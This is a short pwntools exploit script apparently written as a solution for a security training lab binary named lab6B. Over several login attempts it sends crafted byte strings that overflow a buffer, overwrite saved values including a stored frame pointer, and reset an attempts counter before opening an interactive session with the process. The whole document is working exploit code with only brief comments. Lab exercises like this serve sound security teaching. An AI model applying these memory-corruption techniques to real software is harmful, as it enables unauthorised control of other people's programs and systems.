from pwn import *

r = process("/levels/lab06/lab6B")
log.info("PID: {}".format(util.proc.pidof(r)))
pause()

# First login
r.sendline("XXXX" + "XXXX" + "`"*0x18)
r.sendline("@"*0x14 + "\x8a\x05" + "\x20\x20" + " "*8)
# Second login -- Restore attempts and stored ebp
r.sendline("XXXX" + "XXXX" + " "*0x18)
r.sendline("@"*0x14 + "\x40\x40" + "\x60\x60" + " "*8)
# Third try: Run out of tries
r.sendline("")
r.sendline("")
r.interactive()
